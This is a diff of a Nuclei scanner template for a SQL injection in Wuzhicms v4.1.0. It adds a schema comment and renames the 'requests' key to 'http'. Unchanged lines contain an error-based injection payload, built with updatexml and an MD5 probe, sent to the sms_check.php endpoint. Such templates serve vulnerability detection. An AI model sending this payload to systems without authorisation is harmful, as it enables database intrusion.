@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: wuzhicms-sqli
 info:
   name: Wuzhicms v4.1.0 SQL Injection
@@ -8,7 +9,7 @@ info:
   tags: wuzhicms,sqli
 variables:
   num: "999999999"
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20MD5({{num}})),0x7e),1)--%20"
